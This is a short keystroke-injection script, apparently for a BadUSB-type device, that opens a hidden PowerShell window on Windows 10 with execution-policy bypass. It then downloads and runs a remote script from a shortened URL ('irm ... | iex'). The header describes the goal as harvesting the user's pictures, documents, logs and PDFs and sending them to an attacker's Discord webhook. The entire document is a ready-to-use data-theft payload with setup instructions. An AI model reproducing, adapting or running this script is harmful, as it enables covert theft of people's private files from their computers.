// Title: beigeworm's Exfiltrate files to Discord
// Author: @beigeworm
// Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a Discord Webhook.
// Target: Windows 10
// *SETUP*
// replace WEBHOOK_HERE with your Discord Webhook.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://is.gd/bw_ex_to_dc | iex");
delay(500);
press("ENTER");